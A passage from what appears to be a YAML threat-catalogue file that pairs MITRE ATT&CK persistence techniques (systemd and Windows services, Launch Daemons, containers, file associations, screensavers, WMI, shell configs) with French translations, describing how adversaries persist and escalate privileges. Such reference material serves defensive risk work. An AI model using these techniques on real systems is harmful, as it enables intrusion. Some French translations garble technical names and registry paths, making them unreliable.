          \ ExecStopPost \xBB s\u2019ex\xE9cutent lorsqu\u2019un service est arr\xEA\
          t\xE9.  \n\nLes adversaires ont cr\xE9\xE9 de nouveaux fichiers de service,\
          \ modifi\xE9 les commandes ex\xE9cut\xE9es par la directive d\u2019un fichier\
          \ '.service', et modifi\xE9 la directive utilisateur qu\u2019un fichier\
          \ '.service' ex\xE9cute, ce qui pourrait entra\xEEner une escalade de privil\xE8\
          ges. Les adversaires peuvent \xE9galement placer des liens symboliques dans\
          \ ces r\xE9pertoires, permettant au systemd de trouver ces charges utiles\
          \ peu importe leur emplacement sur le syst\xE8me de fichiers. (Citation\
          \ : Anomali Rocke mars 2019)(Citation : syst\xE8mes unix backdoor airwalk)(Citation\
          \ : Persistance du service Rapid7 22JUIN 2016) \n\nLa directive utilisateur\
          \ du fichier '.service' peut \xEAtre utilis\xE9e pour ex\xE9cuter un service\
          \ en tant qu\u2019utilisateur sp\xE9cifique, ce qui pourrait entra\xEEner\
          \ une escalade de privil\xE8ges bas\xE9e sur des permissions sp\xE9cifiques\
          \ d\u2019utilisateur/groupe. \n\nLes services Systemd peuvent \xEAtre cr\xE9\
          \xE9s via des g\xE9n\xE9rateurs systemd, qui supportent la g\xE9n\xE9ration\
          \ dynamique de fichiers unitaires. Les g\xE9n\xE9rateurs systemd sont de\
          \ petits ex\xE9cutables qui s\u2019ex\xE9cutent lors du d\xE9marrage ou\
          \ du rechargement de configuration pour cr\xE9er ou modifier dynamiquement\
          \ des fichiers unitaires systemd en convertissant des configurations non\
          \ natives en services, liens symb\xE9tiques ou drop-ins (c\u2019est-\xE0\
          -dire [scripts d\u2019initialisation de d\xE9marrage ou de connexion](https://attack.mitre.org/techniques/T1037)).\
          \ (Citation : Persistance Linux de Elastic Security Labs 2024)(Citation\
          \ : Pepe Berba Systemd 2022)\nhttps://attack.mitre.org/techniques/T1543/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.003
    ref_id: T1543.003
    name: Windows Service
    description: "Adversaries may create or modify Windows services to repeatedly\
      \ execute malicious payloads as part of persistence. When Windows boots up,\
      \ it starts programs or applications called services that perform background\
      \ system functions.(Citation: TechNet Services) Windows service configuration\
      \ information, including the file path to the service's executable or recovery\
      \ programs/commands, is stored in the Windows Registry.\n\nAdversaries may install\
      \ a new service or modify an existing service to execute at startup in order\
      \ to persist on a system. Service configurations can be set or modified using\
      \ system utilities (such as sc.exe), by directly modifying the Registry, or\
      \ by interacting directly with the Windows API. \n\nAdversaries may also use\
      \ services to install and execute malicious drivers. For example, after dropping\
      \ a driver file (ex: `.sys`) to disk, the payload can be loaded and registered\
      \ via [Native API](https://attack.mitre.org/techniques/T1106) functions such\
      \ as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()`\
      \ and `ZwSetValueKey()`), by creating the required service Registry values (i.e.\
      \ [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using\
      \ command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet\
      \ Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42\
      \ AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s\
      \ to hide the presence of malicious activity on a system. Adversaries may also\
      \ load a signed yet vulnerable driver onto a compromised machine (known as \"\
      Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege\
      \ Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole\
      \ June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created\
      \ with administrator privileges but are executed under SYSTEM privileges, so\
      \ an adversary may also use a service to escalate privileges. Adversaries may\
      \ also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\
      \nTo make detection analysis more challenging, malicious services may also incorporate\
      \ [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004)\
      \ (ex: using a service and/or payload name related to a legitimate OS or benign\
      \ software component). Adversaries may also create \u2018hidden\u2019 services\
      \ (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example\
      \ by using the `sc sdset` command to set service permissions via the Service\
      \ Descriptor Definition Language (SDDL). This may hide a Windows service from\
      \ the view of standard service enumeration methods such as `Get-Service`, `sc\
      \ query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)\nhttps://attack.mitre.org/techniques/T1543/003"
    translations:
      fr:
        name: Windows Service
        description: "Les adversaires peuvent cr\xE9er ou modifier des services Windows\
          \ pour ex\xE9cuter \xE0 plusieurs reprises des charges utiles malveillantes\
          \ dans le cadre de la persistance. Lorsque Windows d\xE9marre, il lance\
          \ des programmes ou applications appel\xE9s services qui effectuent des\
          \ fonctions syst\xE8me en arri\xE8re-plan. (Citation : TechNet Services)\
          \ Les informations de configuration des services Windows, y compris le chemin\
          \ du fichier vers l\u2019ex\xE9cutable du service ou les programmes/commandes\
          \ de r\xE9cup\xE9ration, sont stock\xE9es dans le registre Windows.\n\n\
          Les adversaires peuvent installer un nouveau service ou modifier un service\
          \ existant pour l\u2019ex\xE9cuter au d\xE9marrage afin de persister sur\
          \ un syst\xE8me. Les configurations de service peuvent \xEAtre configur\xE9\
          es ou modifi\xE9es \xE0 l\u2019aide d\u2019utilitaires syst\xE8me (comme\
          \ sc.exe), en modifiant directement le Registre, ou en interagissant directement\
          \ avec l\u2019API Windows. \n\nLes adversaires peuvent \xE9galement utiliser\
          \ des services pour installer et ex\xE9cuter des pilotes malveillants. Par\
          \ exemple, apr\xE8s avoir d\xE9pos\xE9 un fichier de pilote (ex : '.sys')\
          \ sur le disque, la charge utile peut \xEAtre charg\xE9e et enregistr\xE9\
          e via des fonctions [Native API](https://attack.mitre.org/techniques/T1106)\
          \ telles que 'CreateServiceW()' (ou manuellement via des fonctions telles\
          \ que 'ZwLoadDriver()' et 'ZwSetValueKey()'), en cr\xE9ant les valeurs requises\
          \ du registre de service (c\u2019est-\xE0-dire [Modifier le registre](https://attack.mitre.org/techniques/T1112)),\
          \ ou en utilisant des utilitaires en ligne de commande tels que 'PnPUtil.exe'.\
          \ (Citation : Dossier Symantec W.32 Stuxnet)(Citation : Crowdstrike DriveSlayer\
          \ f\xE9vrier 2022)(Citation : Unit42 AcidBox juin 2020) Les adversaires\
          \ peuvent utiliser ces pilotes sous forme de [Rootkit](https://attack.mitre.org/techniques/T1014)\
          \ pour dissimuler la pr\xE9sence d\u2019activit\xE9s malveillantes sur un\
          \ syst\xE8me. Les adversaires peuvent \xE9galement charger un pilote sign\xE9\
          \ mais vuln\xE9rable sur une machine compromise (connue sous le nom de \xAB\
          \ Bring Your Own Vulnerable Driver \xBB (BYOVD)) dans le cadre de [Exploitation\
          \ for Privilege Escalaation](https://attack.mitre.org/techniques/T1068).\
          \ (Citation : ESET InvisiMole juin 2020)(Citation : Unit42 AcidBox juin\
          \ 2020)\n\nLes services peuvent \xEAtre cr\xE9\xE9s avec des privil\xE8\
          ges administrateur mais sont ex\xE9cut\xE9s selon les privil\xE8ges SYSTEM,\
          \ donc un adversaire peut aussi utiliser un service pour escalader des privil\xE8\
          ges. Les adversaires peuvent \xE9galement commencer directement les services\
          \ via [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\
          \nPour rendre l\u2019analyse de d\xE9tection plus difficile, les services\
          \ malveillants peuvent \xE9galement incorporer [Masquerade Task ou Service](https://attack.mitre.org/techniques/T1036/004)\
          \ (ex. : utiliser un nom de service et/ou de charge utile li\xE9 \xE0 un\
          \ syst\xE8me l\xE9gitime ou \xE0 un composant logiciel b\xE9nin). Les adversaires\
          \ peuvent \xE9galement cr\xE9er des services \xAB cach\xE9s \xBB (c\u2019\
          est-\xE0-dire [Hide Artifacts](https://attack.mitre.org/techniques/T1564)),\
          \ par exemple en utilisant la commande 'sc sdset' pour d\xE9finir les permissions\
          \ de service via le Service Descriptor Definition Language (SDDL). Cela\
          \ peut dissimuler un service Windows aux m\xE9thodes standard d\u2019\xE9\
          num\xE9ration de services telles que \xAB Get-Service \xBB, \xAB sc query\
          \ \xBB et \xAB services.exe \xBB. (Citation : SANS 1)(Citation : SANS 2)\n\
          https://attack.mitre.org/techniques/T1543/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.004
    ref_id: T1543.004
    name: Launch Daemon
    description: 'Adversaries may create or modify Launch Daemons to execute malicious
      payloads as part of persistence. Launch Daemons are plist files used to interact
      with Launchd, the service management framework used by macOS. Launch Daemons
      require elevated privileges to install, are executed for every user on a system
      prior to login, and run in the background without the need for user interaction.
      During the macOS initialization startup, the launchd process loads the parameters
      for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code>
      and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters
      include a <code>Label</code> to identify the task, <code>Program</code> to provide
      a path to the executable, and <code>RunAtLoad</code> to specify when the task
      is run. Launch Daemons are often used to provide access to shared resources,
      updates to software, or conduct automation tasks.(Citation: AppleDocs Launch
      Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd
      Keywords for plists)


      Adversaries may install a Launch Daemon configured to execute at startup by
      using the <code>RunAtLoad</code> parameter set to <code>true</code> and the
      <code>Program</code> parameter set to the malicious executable path. The daemon
      name may be disguised by using a name from a related operating system or benign
      software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When
      the Launch Daemon is executed, the program inherits administrative permissions.(Citation:
      WireLurker)(Citation: OSX Malware Detection)


      Additionally, system configuration changes (such as the installation of third
      party package managing software) may cause folders such as <code>usr/local/bin</code>
      to become globally writeable. So, it is possible for poor configurations to
      allow an adversary to modify executables referenced by current Launch Daemon''s
      plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist
      Jun 2019)

      https://attack.mitre.org/techniques/T1543/004'
    translations:
      fr:
        name: Lancement du Daemon
        description: "Les adversaires peuvent cr\xE9er ou modifier des d\xE9mons de\
          \ lancement pour ex\xE9cuter des charges utiles malveillantes dans le cadre\
          \ de la persistance. Les d\xE9mons de lancement sont des fichiers plist\
          \ utilis\xE9s pour interagir avec Launchd, le cadre de gestion de service\
          \ utilis\xE9 par macOS. Les d\xE9mons de lancement n\xE9cessitent des privil\xE8\
          ges \xE9lev\xE9s pour \xEAtre install\xE9s, sont ex\xE9cut\xE9s pour chaque\
          \ utilisateur sur un syst\xE8me avant la connexion, et s\u2019ex\xE9cutent\
          \ en arri\xE8re-plan sans interaction utilisateur. Lors du d\xE9marrage\
          \ de l\u2019initialisation de macOS, le processus lanc\xE9 charge les param\xE8\
          tres des d\xE9mons syst\xE8me \xE0 la demande \xE0 partir de fichiers plist\
          \ trouv\xE9s dans <code>/System/Library/LaunchDaemons/</code> et <code>/Library/LaunchDaemons/</code>.\
          \ Les param\xE8tres requis des d\xE9mons de lancement incluent une <code>\xE9\
          tiquette</code> pour identifier la t\xE2che, <code>un programme</code> pour\
          \ fournir un chemin vers l\u2019ex\xE9cutable, et <code>un RunAtLoad</code>\
          \ pour sp\xE9cifier quand la t\xE2che est ex\xE9cut\xE9e. Les d\xE9mons\
          \ de lancement sont souvent utilis\xE9s pour donner acc\xE8s \xE0 des ressources\
          \ partag\xE9es, mettre \xE0 jour des logiciels ou effectuer des t\xE2ches\
          \ d\u2019automatisation. (Citation : Agent de lancement AppleDocs Daemons)(Citation\
          \ : M\xE9thodes de persistance des malwares Mac)(Citation : lanc\xE9e Mots-cl\xE9\
          s pour les pliss)\n\nLes adversaires peuvent installer un d\xE9mon de lancement\
          \ configur\xE9 pour s\u2019ex\xE9cuter au d\xE9marrage en utilisant le param\xE8\
          tre <code>RunAtLoad</code> r\xE9gl\xE9 sur <code>true</code> et le <code>param\xE8\
          tre Program</code> sur le chemin ex\xE9cutable malveillant. Le nom du d\xE9\
          mon peut \xEAtre d\xE9guis\xE9 en utilisant un nom provenant d\u2019un syst\xE8\
          me d\u2019exploitation apparent\xE9 ou d\u2019un logiciel b\xE9nin (par\
          \ exemple [Masquerading](https://attack.mitre.org/techniques/T1036)). Lorsque\
          \ le d\xE9mon de lancement est ex\xE9cut\xE9, le programme h\xE9rite des\
          \ autorisations administratives. (Citation : WireLurker)(Citation : D\xE9\
          tection de logiciels malveillants OSX)\n\nDe plus, des modifications de\
          \ configuration syst\xE8me (comme l\u2019installation d\u2019un logiciel\
          \ tiers de gestion de paquets) peuvent rendre des dossiers tels que <code>usr/local/bin</code>\
          \ globalement \xE9crivables. Ainsi, il est possible que de mauvaises configurations\
          \ permettent \xE0 un adversaire de modifier les ex\xE9cutables r\xE9f\xE9\
          renc\xE9s par les fichiers plist du Launch Daemon actuel. (Citation : D\xE9\
          tournement de d\xE9mons de lancement)(Citation : sentinelone macos persiste\
          \ juin 2019)\nhttps://attack.mitre.org/techniques/T1543/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.005
    ref_id: T1543.005
    name: Container Service
    description: 'Adversaries may create or modify container or container cluster
      management tools that run as daemons, agents, or services on individual hosts.
      These include software for creating and managing individual containers, such
      as Docker and Podman, as well as container cluster node-level agents such as
      kubelet. By modifying these services, an adversary may be able to achieve persistence
      or escalate their privileges on a host.


      For example, by using the `docker run` or `podman run` command with the `restart=always`
      directive, a container can be configured to persistently restart on the host.(Citation:
      AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may
      also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)


      In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy
      Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including
      ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation:
      Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the
      `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning
      Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)


      Note that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation:
      Podman Systemd)(Citation: Docker Systemd)

      https://attack.mitre.org/techniques/T1543/005'
    translations:
      fr:
        name: Service de conteneurs
        description: "Les adversaires peuvent cr\xE9er ou modifier des outils de gestion\
          \ de conteneurs ou de clusters de conteneurs qui fonctionnent sous forme\
          \ de d\xE9mons, agents ou services sur des h\xF4tes individuels. Cela inclut\
          \ des logiciels pour cr\xE9er et g\xE9rer des conteneurs individuels, tels\
          \ que Docker et Podman, ainsi que des agents au niveau des n\u0153uds de\
          \ cluster de conteneurs tels que kubelet. En modifiant ces services, un\
          \ adversaire peut obtenir la persistance ou augmenter ses privil\xE8ges\
          \ sur un h\xF4te.\n\nPar exemple, en utilisant la commande 'docker run'\
          \ ou 'podman run' avec la directive 'restart=always', un conteneur peut\
          \ \xEAtre configur\xE9 pour red\xE9marrer de mani\xE8re persistante sur\
          \ l\u2019h\xF4te. (Citation : AquaSec TeamTNT 2023) Un utilisateur ayant\
          \ acc\xE8s \xE0 la commande docker (rootful) peut \xE9galement \xEAtre capable\
          \ d\u2019escalader ses privil\xE8ges sur l\u2019h\xF4te. (Citation : va-t\u2019\
          enBins Docker)\n\nDans les environnements Kubernetes, les DaemonSets permettent\
          \ \xE0 un adversaire de [d\xE9ployer de fa\xE7on persistante le conteneur](https://attack.mitre.org/techniques/T1610)\
          \ sur tous les n\u0153uds, y compris ceux ajout\xE9s ult\xE9rieurement au\
          \ cluster. (Citation : Aquasec Kubernetes Attack 2023)(Citation : Kubernetes\
          \ DaemonSet) Les pods peuvent \xE9galement \xEAtre d\xE9ploy\xE9s sur des\
          \ n\u0153uds sp\xE9cifiques en utilisant les champs 'nodeSelector' ou 'nodeName'\
          \ dans la sp\xE9cification des pods. (Citation : Kubernetes assignant des\
          \ pods aux n\u0153uds)(Citation : AppSecco Kubernetes Namespace Breakout\
          \ 2020)\n\nNotez que les conteneurs peuvent \xE9galement \xEAtre configur\xE9\
          s pour fonctionner en tant que [Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation\
          \ : Podman Systemd)(Citation : Docker Systemd)\nhttps://attack.mitre.org/techniques/T1543/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546
    ref_id: T1546
    name: Event Triggered Execution
    description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges.

      https://attack.mitre.org/techniques/T1546'
    translations:
      fr:
        name: "Ex\xE9cution d\xE9clench\xE9e par l\u2019\xE9v\xE9nement"
        description: "Les adversaires peuvent \xE9tablir la persistance et/ou augmenter\
          \ leurs privil\xE8ges en utilisant des m\xE9canismes syst\xE8me qui d\xE9\
          clenchent l\u2019ex\xE9cution en fonction d\u2019\xE9v\xE9nements sp\xE9\
          cifiques. Divers syst\xE8mes d\u2019exploitation disposent de moyens de\
          \ surveiller et de s\u2019abonner \xE0 des \xE9v\xE9nements tels que les\
          \ connexions ou d\u2019autres activit\xE9s utilisateurs, telles que l\u2019\
          ex\xE9cution d\u2019applications ou de binaires sp\xE9cifiques. Les environnements\
          \ cloud peuvent \xE9galement prendre en charge diverses fonctions et services\
          \ qui surveillent et peuvent \xEAtre invoqu\xE9s en r\xE9ponse \xE0 des\
          \ \xE9v\xE9nements cloud sp\xE9cifiques. (Citation : Backdoor d\u2019un\
          \ compte AWS)(Citation : Exfiltration de donn\xE9es Varonis Power Automate)(Citation\
          \ : Rapport de cas Microsoft DART 001)\n\nLes adversaires peuvent abuser\
          \ de ces m\xE9canismes pour maintenir un acc\xE8s persistant \xE0 une victime\
          \ en ex\xE9cutant \xE0 plusieurs reprises du code malveillant. Apr\xE8s\
          \ avoir acc\xE9d\xE9 \xE0 un syst\xE8me victime, les adversaires peuvent\
          \ cr\xE9er/modifier des d\xE9clencheurs d\u2019\xE9v\xE9nements pour pointer\
          \ vers du contenu malveillant qui sera ex\xE9cut\xE9 chaque fois que le\
          \ d\xE9clencheur sera invoqu\xE9. (Citation : FireEye WMI 2015)(Citation\
          \ : Persistance du malware sur OS X)(Citation : malware amn\xE9sique)\n\n\
          Puisque l\u2019ex\xE9cution peut \xEAtre proxy par un compte avec des permissions\
          \ plus \xE9lev\xE9es, comme les comptes SYSTEM ou de service, un adversaire\
          \ peut \xEAtre capable d\u2019abuser de ces m\xE9canismes d\u2019ex\xE9\
          cution d\xE9clench\xE9s pour escalader ses privil\xE8ges.\nhttps://attack.mitre.org/techniques/T1546"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.001
    ref_id: T1546.001
    name: Change Default File Association
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by a file type association. When a file is opened, the default program\
      \ used to open the file (also called the file association or handler) is checked.\
      \ File association selections are stored in the Windows Registry and can be\
      \ edited by users, administrators, or programs that have Registry access or\
      \ by administrators using the built-in assoc utility.(Citation: Microsoft Change\
      \ Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc\
      \ Oct 2017) Applications can modify the file association for a given file extension\
      \ to call an arbitrary program when a file with the given extension is opened.\n\
      \nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>,\
      \ for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler\
      \ for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>.\
      \ The various commands are then listed as subkeys underneath the shell key at\
      \ <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For\
      \ example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n\
      * <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\\
      txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are\
      \ commands that are executed when the handler opens the file extension. Adversaries\
      \ can modify these values to continually execute arbitrary commands.(Citation:\
      \ TrendMicro TROJ-FAKEAV OCT 2012)\nhttps://attack.mitre.org/techniques/T1546/001"
    translations:
      fr:
        name: "Modifier l\u2019association par d\xE9faut des fichiers"
        description: "Les adversaires peuvent \xE9tablir la persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par une association de type\
          \ de fichier. Lorsqu\u2019un fichier est ouvert, le programme par d\xE9\
          faut utilis\xE9 pour l\u2019ouvrir (\xE9galement appel\xE9 association ou\
          \ gestionnaire de fichier) est coch\xE9. Les s\xE9lections d\u2019association\
          \ de fichiers sont stock\xE9es dans le Registre Windows et peuvent \xEA\
          tre modifi\xE9es par des utilisateurs, des administrateurs ou des programmes\
          \ ayant acc\xE8s au Registre, ou par des administrateurs utilisant l\u2019\
          utilitaire associatif int\xE9gr\xE9. (Citation : Microsoft modifie les programmes\
          \ par d\xE9faut)(Citation : Gestionnaires de fichiers Microsoft)(Citation\
          \ : Microsoft Assoc oct. 2017) Les applications peuvent modifier l\u2019\
          association du fichier pour une extension de fichier donn\xE9e afin d\u2019\
          appeler un programme arbitraire lorsqu\u2019un fichier avec l\u2019extension\
          \ donn\xE9e est ouvert.\n\nLes associations de fichiers syst\xE8me sont\
          \ list\xE9es sous <code>HKEY_CLASSES_ROOT\\.[ par exemple,</code> <code>HKEY_CLASSES_ROOT\\\
          .txt</code>. Les entr\xE9es pointent vers un gestionnaire pour cette extension\
          \ situ\xE9 <code>\xE0 HKEY_CLASSES_ROOT\\\\[handler].</code> Les diff\xE9\
          rentes commandes sont ensuite list\xE9es comme sous-cl\xE9s sous la cl\xE9\
          \ shell \xE0 <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>.\
          \ Par exemple : \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n\
          * <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\commande</code>\n* <code>HKEY_CLASSES_ROOT\\\
          txtfile\\shell\\printto\\commande</code>\n\nLes valeurs des cl\xE9s list\xE9\
          es sont des commandes ex\xE9cut\xE9es lorsque le gestionnaire ouvre l\u2019\
          extension de fichier. Les adversaires peuvent modifier ces valeurs pour\
          \ ex\xE9cuter continuellement des commandes arbitraires. (Citation : TrendMicro\
          \ TROJ-FAKEAV OCT. 2012)\nhttps://attack.mitre.org/techniques/T1546/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.002
    ref_id: T1546.002
    name: Screensaver
    description: 'Adversaries may establish persistence by executing malicious content
      triggered by user inactivity. Screensavers are programs that execute after a
      configurable time of user inactivity and consist of Portable Executable (PE)
      files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows
      screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>,
      and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with
      screensavers included with base Windows installations.


      The following screensaver settings are stored in the Registry (<code>HKCU\Control
      Panel\Desktop\</code>) and could be manipulated to achieve persistence:


      * <code>SCRNSAVE.exe</code> - set to malicious PE path

      * <code>ScreenSaveActive</code> - set to ''1'' to enable the screensaver

      * <code>ScreenSaverIsSecure</code> - set to ''0'' to not require a password
      to unlock

      * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver
      is executed


      Adversaries can use screensaver settings to maintain persistence by setting
      the screensaver to run malware after a certain timeframe of user inactivity.(Citation:
      ESET Gazer Aug 2017)

      https://attack.mitre.org/techniques/T1546/002'
    translations:
      fr:
        name: "\xC9conomiseur d\u2019\xE9cran"
        description: "Les adversaires peuvent \xE9tablir leur persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par l\u2019inactivit\xE9 de\
          \ l\u2019utilisateur. Les \xE9conomiseurs d\u2019\xE9cran sont des programmes\
          \ qui s\u2019ex\xE9cutent apr\xE8s un temps configurable d\u2019inactivit\xE9\
          \ de l\u2019utilisateur et consistent en des fichiers ex\xE9cutables portables\
          \ (PE) avec une extension .scr. (Citation : \xC9conomiseur d\u2019\xE9cran\
          \ Wikip\xE9dia) L\u2019application d\u2019\xE9conomiseur d\u2019\xE9cran\
          \ Windows scrnsave.scr se trouve dans <code>C\_:\\Windows\\System32\\</code>\
          \ et <code>C\_:\\Windows\\sysWOW64\\</code> sur les syst\xE8mes Windows\
          \ 64 bits, ainsi que les \xE9conomiseurs d\u2019\xE9cran inclus dans les\
          \ installations de base de Windows.\n\nLes param\xE8tres d\u2019\xE9conomiseur\
          \ d\u2019\xE9cran suivants sont stock\xE9s dans le registre (<code>HKCU\\\
          Panneau de configuration\\Bureau\\</code>) et peuvent \xEAtre modifi\xE9\
          s pour assurer la persistance :\n\n* <code>SCRNSAVE.exe</code> - r\xE9gl\xE9\
          \ sur chemin PE malveillant\n* <code>ScreenSaveActive</code> - r\xE9gl\xE9\
          \ sur '1' pour activer l\u2019\xE9conomiseur d\u2019\xE9cran\n* <code>ScreenSaverIsSecure</code>\
          \ - r\xE9gl\xE9 \xE0 '0' pour ne pas n\xE9cessiter de mot de passe pour\
          \ le d\xE9verrouillage\n* <code>ScreenSaveTimeout</code> - d\xE9finit le\
          \ d\xE9lai d\u2019inactivit\xE9 de l\u2019utilisateur avant l\u2019ex\xE9\
          cution de l\u2019\xE9conomiseur d\u2019\xE9cran\n\nLes adversaires peuvent\
          \ utiliser les param\xE8tres d\u2019\xE9conomiseur d\u2019\xE9cran pour\
          \ maintenir la persistance en configurant l\u2019\xE9conomiseur d\u2019\xE9\
          cran pour ex\xE9cuter un logiciel malveillant apr\xE8s un certain temps\
          \ d\u2019inactivit\xE9 de l\u2019utilisateur. (Citation : ESET Gazer ao\xFB\
          t 2017)\nhttps://attack.mitre.org/techniques/T1546/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.003
    ref_id: T1546.003
    name: Windows Management Instrumentation Event Subscription
    description: "Adversaries may establish persistence and elevate privileges by\
      \ executing malicious content triggered by a Windows Management Instrumentation\
      \ (WMI) event subscription. WMI can be used to install event filters, providers,\
      \ consumers, and bindings that execute code when a defined event occurs. Examples\
      \ of events that may be subscribed to are the wall clock time, user login, or\
      \ the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may\
      \ use the capabilities of WMI to subscribe to an event and execute arbitrary\
      \ code when that event occurs, providing persistence on a system.(Citation:\
      \ FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile\
      \ WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object\
      \ (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation:\
      \ Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription\
      \ execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus\
      \ may result in elevated SYSTEM privileges.\nhttps://attack.mitre.org/techniques/T1546/003"
    translations:
      fr:
        name: "Abonnement \xE0 l\u2019\xE9v\xE9nement d\u2019instrumentation de gestion\
          \ de Windows"
        description: "Les adversaires peuvent \xE9tablir la persistance et augmenter\
          \ leurs privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9\
          \ par un abonnement \xE0 un \xE9v\xE9nement Windows Management Instrumentation\
          \ (WMI). WMI peut \xEAtre utilis\xE9 pour installer des filtres d\u2019\xE9\
          v\xE9nements, des fournisseurs, des consommateurs et des liaisons qui ex\xE9\
          cutent du code lorsqu\u2019un \xE9v\xE9nement d\xE9fini se produit. Des\
          \ exemples d\u2019\xE9v\xE9nements auxquels on peut \xEAtre abonn\xE9 sont\
          \ l\u2019heure de l\u2019horloge murale, la connexion utilisateur ou la\
          \ disponibilit\xE9 de l\u2019ordinateur. (Citation : Mandiant M-Trends 2015)\n\
          \nLes adversaires peuvent utiliser les capacit\xE9s de WMI pour s\u2019\
          abonner \xE0 un \xE9v\xE9nement et ex\xE9cuter un code arbitraire lorsque\
          \ cet \xE9v\xE9nement se produit, assurant ainsi une persistance sur un\
          \ syst\xE8me. (Citation : FireEye WMI SANS 2015)(Citation : FireEye WMI\
          \ 2015) Les adversaires peuvent \xE9galement compiler des scripts WMI \u2013\
          \ en utilisant \xAB mofcomp.exe \xBB \u2013 dans des fichiers Windows Management\
          \ Object (MOF) (extension .mof) qui peuvent \xEAtre utilis\xE9s pour cr\xE9\
          er un abonnement malveillant. (Citation : Persistance Dell WMI)(Citation\
          \ : Microsoft MOF mai 2018)\n\nL\u2019ex\xE9cution par abonnement WMI est\
          \ proxi\xE9e par le processus Provider Host (WmiPrvSe.exe) WMI et peut donc\
          \ entra\xEEner une augmentation des privil\xE8ges SYSTEM.\nhttps://attack.mitre.org/techniques/T1546/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.004
    ref_id: T1546.004
    name: Unix Shell Configuration Modification
    description: "Adversaries may establish persistence through executing malicious\
      \ commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s\
      \ execute several configuration scripts at different points throughout the session\
      \ based on events. For example, when a user opens a command-line interface or\
      \ remotely logs in (such as via SSH) a login shell is initiated. The login shell\
      \ executes scripts from the system (<code>/etc</code>) and the user\u2019s home\
      \ directory (<code>~/</code>) to configure the environment. All login shells\
      \ on a system use /etc/profile when initiated. These configuration scripts run\
      \ at the permission level of their directory and are often used to set environment\
      \ variables, create aliases, and customize the user\u2019s environment. When\
      \ the shell exits or terminates, additional shell scripts are executed to ensure\
